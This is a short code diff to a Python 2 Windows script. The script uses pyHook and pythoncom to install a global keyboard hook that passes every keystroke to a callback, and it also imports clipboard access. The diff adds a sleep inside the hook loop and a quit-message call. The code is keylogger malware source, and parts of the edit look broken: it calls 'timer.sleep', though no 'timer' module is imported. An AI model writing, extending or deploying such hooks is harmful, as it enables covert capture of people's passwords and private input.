@@ -2,6 +2,7 @@ from ctypes import *
 import pythoncom
 import pyHook
 import win32clipboard
+import win32api
 
 user32 = windll.user32
 kernel32 = windll.kernel32
@@ -72,12 +73,13 @@ def run():
     print "\n 0000000"
     ti=0
     while ti<5 :
+        timer.sleep(1)
         ti+=1
         kl = pyHook.HookManager()
         kl.KeyDown = KeyStroke
         kl.HookKeyboard()
         pythoncom.PumpMessages()
         
-        
+    win32api.PostQuitMessage()    
     print("key over")
     return 0
